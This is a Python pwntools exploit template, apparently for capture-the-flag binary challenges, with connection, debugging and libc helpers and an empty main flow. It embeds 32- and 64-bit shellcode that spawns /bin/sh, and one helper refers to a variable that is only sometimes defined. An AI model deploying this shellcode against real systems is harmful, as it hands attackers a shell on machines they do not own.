#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './program_name'
binary = ELF("program_name")

remote_server = 'ip of the server'
PORT = 'number'

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)
else:
    p = process(program_name)

if args.lib:
    libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name
    r = binary.process(env={'LD_PRELOAD' : libc.path})

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# USEFUL FUNCTIONS
def console_output():
    data = p.recv(2000)
    # print data

def send_data(payload):
    # print '[*] payload'
    p.sendline(payload)

def wait_for_prompt(sentence):
  print r.recvuntil(sentence)

def get_symbols(x, y):
    x = p32(binary.symbols[y])
    # Example: read_got = p32(binary.symbols["read"])

def search_binsh():
    return libc.search("/bin/sh").next()

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":



    p.interactive()
